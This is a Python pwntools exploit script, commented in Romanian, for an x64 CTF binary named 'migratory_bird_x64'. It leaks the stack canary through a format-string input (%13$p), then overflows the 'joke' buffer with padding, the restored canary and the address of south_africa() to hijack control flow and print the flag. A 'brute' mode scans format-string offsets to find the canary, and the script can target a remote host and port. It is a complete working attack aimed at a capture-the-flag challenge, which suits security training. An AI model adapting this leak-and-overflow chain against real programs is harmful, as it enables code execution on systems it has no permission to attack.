#!/usr/bin/env python3
# ============================================================================
# CTF: migratory_bird_x64 — BOF cu stack canary => leak + ret2win (x64)
# Vulnerabilitate: format string la "name" (%13$p) scurge canary-ul; apoi overflow
#   la "joke": 40 padding + canary refacut + 8 (rbp) + ret in south_africa().
# Binar: ELF 64-bit (amd64), not stripped | NX OFF · CANARY ON · No-PIE · Partial RELRO
#   - Canary prezent => leak obligatoriu si rescriere la loc inainte de ret.
#     Offset format string difera de x32 (%13$p vs %15$p). No-PIE => south_africa fix.
# Moduri:
#   direct (exploit real):    python3 script.py            |  python3 script.py HOST PORT
#   brute (gaseste canary):   python3 script.py brute       |  python3 script.py HOST PORT brute
# ============================================================================
import sys
import re
from pwn import *

context.binary = elf = ELF('./migratory_bird_x64')
context.log_level = 'error'          # scoate zgomotul pwntools

N = 13                               # offsetul canary-ului (confirmat cu 'brute')

def connect():
    # remote doar daca ai dat HOST + PORT numeric; altfel proces local
    if len(sys.argv) >= 3 and sys.argv[2].isdigit():
        return remote(sys.argv[1], sys.argv[2])
    return process('./migratory_bird_x64')

def leak_at(n):
    # o conexiune noua per offset: numele se citeste o singura data pe rulare
    p = connect()
    try:
        p.recvuntil(b"Tell me your name: ")
        p.sendline(b"%%%d$p" % n)          # ex. n=13 -> b"%13$p"
        out = p.recvline().strip()
    except EOFError:
        out = b""
    finally:
        p.close()
    m = re.search(rb"0x([0-9a-fA-F]+)", out)
    return int(m.group(1), 16) if m else None

def looks_like_canary(v):
    # Canary glibc = LSB nul (aliniere) + restul octetilor random. Semnalul cheie:
    # octetii de sus sunt POPULATI (nu e un pointer jos / o valoare cu zerouri sus).
    if v is None or (v & 0xff) != 0:
        return False
    # 7 octeti random => aproape mereu >= 2^48; asta exclude si pointerii
    # 0x00007f.. (stiva/libc) si adresele de cod/.data No-PIE.
    return v >= (1 << 48)

# --- mod brute: scaneaza offseturile si marcheaza canary-ul -----------------
if 'brute' in sys.argv:
    hexw = 16
    cand = None
    for n in range(1, 41):
        v = leak_at(n)
        if v is None:
            continue
        mark = ""
        if looks_like_canary(v):
            mark = "  <-- posibil CANARY"
            if cand is None:
                cand = n
        print("%%%d$p = 0x%0*x%s" % (n, hexw, v, mark))
    if cand is not None:
        print("\n[+] canary probabil la offsetul %d  (pune N = %d in script)" % (cand, cand))
    else:
        print("\n[-] niciun candidat clar; uita-te la valorile care se termina in 00")
    sys.exit(0)

# --- mod direct: exploit real (leak canary la N + overflow, aceeasi conexiune) ---
p = connect()

south_africa = elf.symbols['south_africa']

p.recvuntil(b"Tell me your name: ")
p.sendline(b"%%%d$p" % N)
canary = int(p.recvline().strip(), 16)

payload  = b"A" * 40
payload += p64(canary)
payload += b"B" * 8
payload += p64(south_africa)

p.recvuntil(b"Now tell me a joke:")
p.sendline(payload)

out = p.recvall(timeout=2)
# cauta un flag care incepe cu CTF, SI sau FLAG; daca nu-l gaseste, arata output-ul brut
flag = re.search(rb"(CTF|SI|FLAG)\{[^}]*\}", out)
print(flag.group().decode() if flag else out)
